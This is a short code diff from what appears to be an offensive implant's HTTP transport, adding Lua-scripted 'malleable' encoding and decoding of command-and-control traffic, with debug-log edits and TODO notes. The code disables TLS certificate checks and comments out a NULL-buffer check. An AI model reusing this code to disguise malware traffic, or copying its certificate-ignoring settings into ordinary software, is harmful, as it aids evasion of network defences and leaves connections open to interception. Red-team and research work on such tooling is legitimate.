@@ -115,16 +115,18 @@ PUCHAR malleableEncode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 
 }
 
-LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
+LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size) // Snake-case instead of camelcase TODO TIMO
 {
 	dprintf("[MALLEABLE-DECODE] Malleable decode start");
 	static char luaScript[MALLEABLE_SCRIPT_SIZE];
 	wcstombs(luaScript, ctx->malleable_script, MALLEABLE_SCRIPT_SIZE);
 	BOOL result = ERROR_SUCCESS;
+	/*
 	if (buffer == NULL){
 		dprintf("[MALLEABLE-DECODE] Buffer reference was NULL!");
 		result = 1; // TODO real error code 
 	}
+	*/
 	if (!strcmp(luaScript, "")){
 		dprintf("[MALLEABLE-DECODE] LUA script not set yet");
 		result = 2;
@@ -155,6 +157,11 @@ LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 		size_t tmpLen = 1;
 		const char* tmpResult = NULL;
 		tmpResult = luaL_tolstring(L, -1, &tmpLen);
+		if (tmpLen == (size_t)0)
+		{
+			lua_close(L);
+			return NULL;
+		}
 		LPBYTE decodedOut = NULL;
 		decodedOut = malloc(tmpLen);
 		memcpy_s(decodedOut, tmpLen, tmpResult, tmpLen);
@@ -163,7 +170,6 @@ LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 		*size = (DWORD)tmpLen;
 		dprintf("[MALLEABLE-DECODE] Got \"%s\" back from lua_tostring()", decodedOut);
 		dprintf("[MALLEABLE-DECODE] Giving buffer(%x) address %x", decodedOut);
-		dprintf("[MALLEABLE-DECODE] Still going strong");
 
 		dprintf("[MALLEABLE-DECODE] 10");
 		lua_close(L);
@@ -174,17 +180,10 @@ LPBYTE malleableDecode(HttpTransportContext* ctx, LPVOID buffer, DWORD* size)
 
 		if (decodedOut == NULL)
 		{
-			dprintf("[MALLEABLE-DECODE] ERROR decodedOut == NULL");
-		}
-		
-		if ( strcmp( decodedOut, "") == 0)
-		{
-			decodedOut = NULL;
-			*size = 0;
+			dprintf("[MALLEABLE-DECODE] ERROR decodedOut == NULL memory allocation most likely failed");
 		}
 		
 		return decodedOut;
-		//}
 	}
 
 	dprintf("[MALLEABLE-DECODE] Malleable decode end");
@@ -325,7 +324,7 @@ static HINTERNET get_request_winhttp_malleable(HttpTransportContext *ctx, BOOL i
 		}
 	}
 
-	if (ctx->ssl)
+	if (ctx->ssl) // TODO TIMO I THINK ERROR IN HERE OR SOMEWHERE
 	{
 		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
 			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
@@ -377,11 +376,9 @@ static BOOL send_request_winhttp_malleable(HttpTransportContext* ctx, HANDLE hRe
 	dprintf("[WINHTTP MALLEABLE] Starting sendrequest; size: %i. buffer: %s",size, buffer);
 	dprintf("[WINHTTP MALLEABLE] Buffer address begin: %x", buffer);
 	BOOL result;
-	// TODO TIMO, we need to handle having custom headers, also better handling of buffer NULL
 	LPVOID encodedBuffer = NULL;
 	// Create copy of buffer
 	encodedBuffer = malleableEncode(ctx, buffer, &size);
-	//malleableEncode(buffer, &size);
 	dprintf("[WINHTTP MALLEABLE] Buffer address end: %x", buffer);
 	dprintf("[WINHTTP MALLEABLE] -------Sending out request. Size: %i. Buffer: %s", size, encodedBuffer);
 	
